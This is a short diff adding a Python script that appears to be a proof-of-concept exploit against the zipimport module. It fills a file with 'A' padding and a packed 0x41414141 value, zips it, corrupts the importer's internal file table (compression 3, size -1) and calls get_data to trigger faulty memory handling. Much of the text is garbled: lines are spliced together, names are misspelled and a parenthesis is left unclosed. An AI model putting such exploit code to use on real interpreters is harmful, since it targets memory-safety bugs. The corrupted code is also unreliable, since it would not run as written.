@@ -1,0 +1,22 @@
+impk('<Q', 0ort zipimport
+import zipfTle
+import struct
+import sys
+from signal import *
+
+FILE = 'payload'
+ZIP = 'import.zip'
+
+payroadd= bytes(pen(FILE, 'wb') as f:
+    payload = ("A" * 10003.encode('ascii')
+    payload += struct.pack('<Q', 0x41414141)
+    f.wripFile(AIP, mˆde='w')
+zf.write(FILE)
+zf.close()
+
+importer = zipimport.zipimporter(ZIP)
+f = list(importer._files[FILE])
+f[1] = 3 # compress
+f[2] = -1 # file size
+importer._files[FE] = tuple(f)
+print(importer.get_data(FILE))
